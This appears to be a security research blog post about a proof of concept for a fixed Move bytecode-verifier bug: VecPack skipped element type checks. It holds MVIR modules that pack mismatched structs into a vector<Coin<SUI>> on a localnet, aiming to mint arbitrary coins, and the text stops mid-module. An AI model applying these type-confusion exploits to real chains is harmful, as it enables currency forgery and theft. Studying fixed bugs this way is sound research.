@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Poc for VecPack bug in Move Compiler Task[04]</title>
+  <meta name="description" content="Building n Breaking">
+
+  <!-- Social: Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@D4r3_D3v1L_">
+  <meta name="twitter:title" content="Poc for VecPack bug in Move Compiler Task[04]">
+  <meta name="twitter:description" content="Building n Breaking">
+  
+  <meta property="twitter:image:src" content="http://localhost:4000/assets/img/opengraph.png">
+  
+
+  <!-- Social: Facebook / Open Graph -->
+  <meta property="og:url" content="http://localhost:4000/blog/2023/07/26/Task04-move-bytecode-poc.html">
+  <meta property="og:title" content="Poc for VecPack bug in Move Compiler Task[04]">
+  
+  <meta property="og:image" content="http://localhost:4000/assets/img/opengraph.png">
+  
+  <meta property="og:description" content="Building n Breaking">
+  <meta property="og:site_name" content="jekyll-theme-potato-hacker">
+
+  <!-- Social: Schema.org  -->
+  <meta itemprop="name" content="Poc for VecPack bug in Move Compiler Task[04]"/>
+  <meta itemprop="description" content="Building n Breaking">
+  <meta itemprop="image" content="http://localhost:4000/assets/img/opengraph.png"/>
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+  <!-- Android Lolipop Theme Color -->
+  <meta name="theme-color" content="#2a4d14">
+
+  <!-- Styles -->
+  <link rel="stylesheet" id="css-theme" href="/assets/css/main-dark.css">
+  <link rel="stylesheet" href="/assets/css/highlight/gruvbox.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+
+  <!-- Javascript -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
+  <script type="text/javascript" src="/assets/js/main.js"></script>
+</head>
+
+
+<body class="animated fadeIn">
+  <div class="container">
+    <div id="background-div">
+      <svg id="background-svg">
+        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
+          <stop stop-opacity="0" class="bgColor2" offset="0%" />
+          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
+          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
+          <stop stop-opacity="0" class="bgColor1" offset="100%" />
+        </lineargradient>
+        <g id="bg-layer1"></g>
+        <g id="bg-layer2" class="hide"></g>
+        <g id="bg-layer3"></g>
+        <g id="bg-layer4"></g>
+      </svg>
+    </div>
+    <section class="header">
+      <header>
+	<div class="row">
+		<div class="col-xs-12">
+			<nav class="navbar navbar-default navbar-fixed-top">
+				<div class="container">
+					<div class="navbar-header">
+						<a
+							class="navbar-toggle collapsed navbar-icon"
+							data-toggle="collapse"
+							data-target="#bs-example-navbar-collapse-1"
+						>
+							<i class="fa fa-bars fa-2x"></i>
+						</a>
+						<a
+							class="navbar-brand navbar-icon"
+							href="/"
+						>
+							<i class="fa fa-home fa-2x"></i>
+						</a>
+					</div>
+
+					<div
+						class="collapse navbar-collapse"
+						id="bs-example-navbar-collapse-1"
+					>
+						<ul class="nav navbar-nav navbar-right">
+							<li>
+								<a href="/"
+									>Home</a
+								>
+							</li>
+							
+							<li>
+								<a href="/blog"
+									>Blog</a
+								>
+							</li>
+							
+
+							<!-- 
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority="1"><a href="/dropdown/dropdown1_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority="2"><a href="/dropdown/dropdown1_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item3">
+                    <li priority="3"><a href="/dropdown/dropdown1_item3.html">item3</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/dropdown/dropdown2_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority=""><a href="/dropdown/dropdown2_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown3">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown3
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/dropdown/dropdown3_item1.html">item1</a></li>
+                  </ul>
+                </li>
+               -->
+							
+							<li class="nav-item">
+								<a
+									href="/items/about.html"
+									>About</a
+								>
+							</li>
+							
+
+							<script>
+								// clean repeated dropdowns and add <li> to their positions
+								let done = [];
+								let elements = [];
+								$(".dropdown")
+								  //
+								  .each((index0 , value0) => {
+								    let dropdownClass = "."+$(value0)[0].classList[1];
+								    if (done.indexOf(dropdownClass) !== -1) return
+								    done.push(dropdownClass)
+								    let dropdownMain = $(dropdownClass)[0]
+								    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
+								    $(dropdownClass+">ul>li").remove();
+								    $(dropdownClass+">ul").append(itemsList)
+								    $(dropdownClass).remove();
+								    elements.push(dropdownMain)
+								});
+								let priority = [ "About", ];
+								elements = elements.concat(...$(".nav-item").remove())
+								priority.map(text => {
+								  elements = elements.filter(node => {
+								      let nodeText = node.querySelector("a").textContent.trim()
+								      if (text == nodeText) {
+								          $(".nav").append(node)
+								          return false;
+								      }
+								      return true;
+								  })
+								});
+								$(".nav").append(elements)
+							</script>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</div>
+	</div>
+</header>
+
+    </section>
+    <section class="content">
+      <div class="row">
+        <!-- <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="left-pane">
+          </div>
+        </div> -->
+        <div class="col-sm-8 col-sm-offset-2 content-div">
+          <div class="page-separator hidden-xs">
+            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
+          </div>
+          <div class="page-separator visible-xs">
+            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
+          </div>
+          <h1 class="post-title page-title" id="title"><a href="#title">Poc for VecPack bug in Move Compiler Task[04]</a></h1>
+          <h4 class="post-title"> 2023-07-26 14:57:43 +0530 </h4>
+<article class="blog-post">
+  <p>This is the last task which is writing a poc for a bug in move compiler code by reverting the patch.</p>
+
+<!--more-->
+
+<p>I was given this task :</p>
+
+<p><code class="language-plaintext highlighter-rouge">Please briefly describe this bug and write a proof of concept against Sui devnet with this patch reverted: https://github.com/move-language/move/pull/491. to demonstrate impact, please write an exploit which will enable you to mint an arbitrary amount of Coin&lt;SUI&gt;  against a localnet validator with this patch reverted.</code> <a href="https://github.com/move-language/move/pull/491">PR</a></p>
+
+<p>There is not much details in the PR about the bug except the file changes.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Before Fix</code></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nn">Bytecode</span><span class="p">::</span><span class="nf">VecPack</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">element_type</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">verifier</span><span class="py">.resolver</span><span class="nf">.signature_at</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">)</span><span class="na">.0</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+            <span class="k">for</span> <span class="mi">_</span> <span class="n">in</span> <span class="mi">0</span><span class="o">..*</span><span class="n">num</span> <span class="p">{</span>
+                <span class="n">verifier</span><span class="py">.stack</span><span class="nf">.pop</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+            <span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">After Fix</code></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nn">Bytecode</span><span class="p">::</span><span class="nf">VecPack</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">element_type</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">verifier</span><span class="py">.resolver</span><span class="nf">.signature_at</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">)</span><span class="na">.0</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+            <span class="k">for</span> <span class="mi">_</span> <span class="n">in</span> <span class="mi">0</span><span class="o">..*</span><span class="n">num</span> <span class="p">{</span>
+                <span class="k">let</span> <span class="n">operand_type</span> <span class="o">=</span> <span class="n">verifier</span><span class="py">.stack</span><span class="nf">.pop</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+                <span class="k">if</span> <span class="n">element_type</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">operand_type</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nf">Err</span><span class="p">(</span><span class="n">verifier</span><span class="nf">.error</span><span class="p">(</span><span class="nn">StatusCode</span><span class="p">::</span><span class="n">TYPE_MISMATCH</span><span class="p">,</span> <span class="n">offset</span><span class="p">));</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="bug-">Bug :</h3>
+
+<p>The move-bytecode-verifier not checking the Vector type and the values in the VecPack instruction is same or not.</p>
+
+<h3 id="writing-poc-patch-reverted">Writing POC (Patch reverted):</h3>
+
+<ul>
+  <li>
+    <p>I first checked how the <code class="language-plaintext highlighter-rouge">VecPack</code> instruction is created in move .</p>
+  </li>
+  <li>
+    <p>After writing a move module i disassembled the bytecode where I found that only <code class="language-plaintext highlighter-rouge">vector:empty()</code> creating <code class="language-plaintext highlighter-rouge">VecPack</code> instruction and move compiler won’t
+let me push a different type data into Vector</p>
+  </li>
+  <li>
+    <p>I came across the <code class="language-plaintext highlighter-rouge">move intermediate language (MVIR)</code> which have the <code class="language-plaintext highlighter-rouge">vec_pack_n</code> instruction.So I have seen how to write move module in <code class="language-plaintext highlighter-rouge">.mvir</code>.</p>
+  </li>
+</ul>
+
+<p>After looking into some mvir examples in the repo , I wrote a simple code to check if my code is correct or not.</p>
+
+<p>I didn’t find a way to compile and verify the mvir code , so I used the testing framework to compile and verify the module.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">use</span> <span class="nn">move_ir_compiler</span><span class="p">::</span><span class="n">Compiler</span> <span class="k">as</span> <span class="n">IRCompiler</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">new_compiler</span> <span class="o">=</span> <span class="n">IRCompiler</span> <span class="p">{</span> <span class="n">deps</span><span class="p">:</span> <span class="nd">vec!</span><span class="p">[]</span> <span class="p">};</span>
+
+    <span class="k">let</span> <span class="n">new_module_code</span> <span class="o">=</span> <span class="s">"
+    module 0x2.Math {
+
+        test() {
+            let v1: vector&lt;bool&gt;;
+
+        label b0:
+            v1 = vec_pack_1&lt;bool&gt;(122221);
+            return;
+        }
+      }
+
+    "</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">new_module</span> <span class="o">=</span> <span class="n">new_compiler</span>
+        <span class="nf">.into_compiled_module</span><span class="p">(</span><span class="n">new_module_code</span><span class="p">)</span>
+        <span class="nf">.expect</span><span class="p">(</span><span class="s">"Failed to compile"</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">status</span> <span class="o">=</span> <span class="nn">move_bytecode_verifier</span><span class="p">::</span><span class="nf">verify_module_unmetered</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_module</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"Verfied Status - {:#?}"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p><strong>Output</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Verfied Status - Ok<span class="o">(</span>
+    <span class="o">()</span>,
+</code></pre></div></div>
+
+<p>Now I know how to write mvir in move and verify it but for the poc I need Sui blockchain context. For that I used <code class="language-plaintext highlighter-rouge">sui_transactional_test_runner</code> .</p>
+
+<p><code class="language-plaintext highlighter-rouge">sui_transactional_test_runner</code> - which is used by the sui to test the code.</p>
+
+<p>I started writing the actual poc ,</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c">//# publish</span>
+<span class="n">module</span> <span class="mi">0x0</span><span class="py">.mycoin</span> <span class="p">{</span>
+      <span class="n">import</span> <span class="mi">0x2</span><span class="py">.object</span><span class="p">;</span>
+      <span class="n">import</span> <span class="mi">0x2</span><span class="py">.tx_context</span><span class="p">;</span>
+      <span class="n">import</span> <span class="mi">0x2</span><span class="py">.transfer</span><span class="p">;</span>
+	    <span class="n">import</span> <span class="mi">0x2</span><span class="py">.sui</span><span class="p">;</span>
+     	<span class="n">import</span> <span class="mi">0x2</span><span class="py">.coin</span><span class="p">;</span>
+     	<span class="n">import</span> <span class="mi">0x1</span><span class="py">.vector</span><span class="p">;</span>
+     	<span class="n">import</span> <span class="mi">0x1</span><span class="py">.option</span><span class="p">;</span>
+
+     	<span class="k">struct</span> <span class="n">Wrapper</span> <span class="n">has</span> <span class="n">key</span> <span class="p">{</span>
+            <span class="n">id</span><span class="p">:</span> <span class="n">object</span><span class="py">.UID</span><span class="p">,</span>
+     		    <span class="n">coins</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">,</span>
+       <span class="p">}</span>
+
+     	<span class="k">struct</span> <span class="n">MYCOIN</span> <span class="n">has</span> <span class="k">drop</span> <span class="p">{</span>
+			 <span class="n">id</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+		  <span class="p">}</span>
+
+     	<span class="nf">test</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">tx_context</span><span class="py">.TxContext</span><span class="p">){</span>
+     		<span class="k">let</span> <span class="n">v1</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">wrap</span><span class="p">:</span> <span class="n">Self</span><span class="py">.Wrapper</span><span class="p">;</span>
+     	<span class="n">label</span> <span class="n">b0</span><span class="p">:</span>
+     		<span class="n">v1</span> <span class="o">=</span> <span class="n">vec_pack_1</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">MYCOIN</span> <span class="p">{</span><span class="n">id</span> <span class="p">:</span> <span class="mi">10</span><span class="p">});</span>
+            <span class="n">wrap</span> <span class="o">=</span> <span class="n">Wrapper</span> <span class="p">{</span> <span class="n">id</span> <span class="p">:</span> <span class="n">object</span><span class="nf">.new</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">)),</span> <span class="n">coins</span><span class="p">:</span> <span class="k">move</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="p">}</span> <span class="p">;</span>
+     		<span class="n">transfer</span><span class="py">.transfer</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.Wrapper</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">wrap</span><span class="p">),</span><span class="n">tx_context</span><span class="nf">.sender</span><span class="p">(</span><span class="nf">freeze</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))));</span>
+			<span class="k">return</span><span class="p">;</span>
+     	<span class="p">}</span>
+
+     <span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pub</span> <span class="k">const</span> <span class="n">TEST_DIR</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span> <span class="o">=</span> <span class="s">"tests"</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">sui_transactional_test_runner</span><span class="p">::</span><span class="n">run_test</span><span class="p">;</span>
+
+<span class="nn">datatest_stable</span><span class="p">::</span><span class="nd">harness!</span><span class="p">(</span><span class="n">run_test</span><span class="p">,</span> <span class="n">TEST_DIR</span><span class="p">,</span> <span class="s">r".*\.(mvir|move)$"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><strong>Output:</strong></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">processed</span> <span class="mi">1</span> <span class="n">task</span>
+
+<span class="n">task</span> <span class="mi">0</span> <span class="nv">'publish</span><span class="err">'</span><span class="py">. lines</span> <span class="mi">1</span><span class="o">-</span><span class="mi">30</span><span class="p">:</span>
+<span class="n">created</span><span class="p">:</span> <span class="nf">object</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">mutated</span><span class="p">:</span> <span class="nf">object</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">gas</span> <span class="n">summary</span><span class="p">:</span> <span class="n">computation_cost</span><span class="p">:</span> <span class="mi">1000000</span><span class="p">,</span> <span class="n">storage_cost</span><span class="p">:</span> <span class="mi">6695600</span><span class="p">,</span>  <span class="n">storage_rebate</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">non_refundable_storage_fee</span><span class="p">:</span> <span class="mi">0</span>
+</code></pre></div></div>
+
+<p>When I run this by publishing the module it is working fine.It’s just publishing the module but I need to run it.</p>
+
+<p>After checking some example tests I found that init function which is invoking along with publish command.</p>
+
+<p>So I renamed the functino to <code class="language-plaintext highlighter-rouge">init</code> and ran the tests where I encountered a Error which took most of my time debugging it.</p>
+
+<p><strong>Error</strong> - <code class="language-plaintext highlighter-rouge">Failed to deserialize already serialized Move value</code></p>
+
+<p>After debugging I found that Vector type and the elements in the vec_pack should maintain same structure.</p>
+
+<p>To check that I used this module :</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">//# publish</span>
+<span class="n">module</span> <span class="mi">0x0</span><span class="py">.mycoin</span> <span class="p">{</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.object</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.tx_context</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.transfer</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.sui</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.coin</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.vector</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.option</span><span class="p">;</span>
+
+        <span class="k">struct</span> <span class="n">MYCOIN</span> <span class="n">has</span> <span class="n">store</span> <span class="p">{</span>
+             <span class="n">id</span><span class="p">:</span> <span class="nb">u64</span><span class="p">,</span>
+        <span class="p">}</span>
+
+        <span class="k">struct</span> <span class="n">DCOIN</span> <span class="n">has</span> <span class="n">store</span> <span class="p">{</span>
+             <span class="n">id</span><span class="p">:</span><span class="nb">u64</span><span class="p">,</span>
+        <span class="p">}</span>
+
+        <span class="k">struct</span> <span class="n">Wrapper</span> <span class="n">has</span> <span class="n">key</span> <span class="p">{</span>
+            <span class="n">id</span><span class="p">:</span> <span class="n">object</span><span class="py">.UID</span><span class="p">,</span>
+            <span class="n">coins</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">,</span>
+        <span class="p">}</span>
+
+
+
+         <span class="nf">init</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">tx_context</span><span class="py">.TxContext</span><span class="p">){</span>
+             <span class="k">let</span> <span class="n">v1</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+             <span class="k">let</span> <span class="n">wrap</span><span class="p">:</span> <span class="n">Self</span><span class="py">.Wrapper</span><span class="p">;</span>
+         <span class="n">label</span> <span class="n">b0</span><span class="p">:</span>
+             <span class="n">v1</span> <span class="o">=</span> <span class="n">vec_pack_2</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">(</span><span class="n">DCOIN</span><span class="p">{</span><span class="n">id</span> <span class="p">:</span><span class="mi">3</span> <span class="p">},</span><span class="n">DCOIN</span> <span class="p">{</span><span class="n">id</span><span class="p">:</span><span class="mi">4</span><span class="p">});</span>
+             <span class="n">wrap</span> <span class="o">=</span> <span class="n">Wrapper</span><span class="p">{</span> <span class="n">id</span> <span class="p">:</span> <span class="n">object</span><span class="nf">.new</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))</span> <span class="p">,</span><span class="n">coins</span><span class="p">:</span> <span class="k">move</span><span class="p">(</span><span class="n">v1</span><span class="p">)};</span>
+             <span class="n">transfer</span><span class="py">.transfer</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.Wrapper</span><span class="o">&gt;</span><span class="p">(</span><span class="k">move</span><span class="p">(</span><span class="n">wrap</span><span class="p">),</span><span class="n">tx_context</span><span class="nf">.sender</span><span class="p">(</span><span class="nf">freeze</span><span class="p">(</span><span class="k">copy</span><span class="p">(</span><span class="n">ctx</span><span class="p">))));</span>
+            <span class="k">return</span><span class="p">;</span>
+         <span class="p">}</span>
+
+     <span class="p">}</span>
+</code></pre></div></div>
+
+<p>It’s working fine ,Now to mint <code class="language-plaintext highlighter-rouge">Coin&lt;SUI&gt;</code> , I need to pass another <code class="language-plaintext highlighter-rouge">Coin&lt;MYCOIN&gt;</code>.</p>
+
+<p>I wrote this code to mint <code class="language-plaintext highlighter-rouge">MYCOIN</code> in <strong>mvir</strong> using Coin module from <strong>sui</strong>.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">//# publish</span>
+<span class="n">module</span> <span class="mi">0x0</span><span class="py">.mycoin</span> <span class="p">{</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.object</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.tx_context</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.transfer</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.sui</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x2</span><span class="py">.coin</span><span class="p">;</span>
+		<span class="n">import</span> <span class="mi">0x2</span><span class="py">.url</span><span class="p">;</span>
+		<span class="n">import</span> <span class="mi">0x2</span><span class="py">.balance</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.vector</span><span class="p">;</span>
+        <span class="n">import</span> <span class="mi">0x1</span><span class="py">.option</span><span class="p">;</span>
+
+
+		<span class="k">struct</span> <span class="n">MYCOIN</span> <span class="n">has</span> <span class="k">drop</span> <span class="p">{</span> <span class="n">dummy</span> <span class="p">:</span> <span class="nb">bool</span><span class="p">}</span>
+
+		<span class="k">struct</span> <span class="n">Wrapper</span> <span class="n">has</span> <span class="n">key</span> <span class="p">{</span>
+            <span class="n">id</span><span class="p">:</span> <span class="n">object</span><span class="py">.UID</span><span class="p">,</span>
+            <span class="n">coins</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">,</span>
+        <span class="p">}</span>
+
+		<span class="nf">init</span><span class="p">(</span><span class="mi">_</span><span class="n">otw</span><span class="p">:</span> <span class="n">Self</span><span class="py">.MYCOIN</span><span class="p">,</span><span class="n">ctx</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">tx_context</span><span class="py">.TxContext</span><span class="p">){</span>
+            <span class="k">let</span> <span class="n">v1</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">sui</span><span class="py">.SUI</span><span class="o">&gt;&gt;</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">wrap</span><span class="p">:</span> <span class="n">Self</span><span class="py">.Wrapper</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">cap</span><span class="p">:</span> <span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">mutcap</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">coin</span><span class="py">.TreasuryCap</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">metadata</span> <span class="p">:</span> <span class="n">coin</span><span class="py">.CoinMetadata</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">vec</span> <span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">decimals</span><span class="p">:</span> <span class="nb">u8</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">symbol</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">name</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">description</span><span class="p">:</span> <span class="n">vector</span><span class="o">&lt;</span><span class="nb">u8</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">icon_url</span><span class="p">:</span> <span class="n">option</span><span class="py">.Option</span><span class="o">&lt;</span><span class="n">url</span><span class="py">.Url</span><span class="o">&gt;</span><span class="p">;</span>
+			<span class="k">let</span> <span class="n">c</span> <span class="p">:</span> <span class="n">coin</span><span class="py">.Coin</span><span class="o">&lt;</span><span class="n">Self</span><span class="py">.MYCOIN</span><span class="o">&gt;</span><span class="p">;</span>
+         <span class="n">label</span> <span class="n">b0</span><span class="p">:</span>
+			<span class="n">decimals</span> <span class="o">=</span> <span class="mi">2u8</span><span class="p">;</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">name</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">description</span> <span class="o">=</span> <span class="n">h</span><span class="s">"bac1ac"</span><span class="p">;</span>
+			<span class="n">icon_url</span> <span class="o">=</span> <span class="n">option</span><span class="py">.none</span><span class="o">&lt;</span><span class="n">url</span><span class="py">.Url</span><span class="o">&gt;</span><span class="p">();</span>
+
+
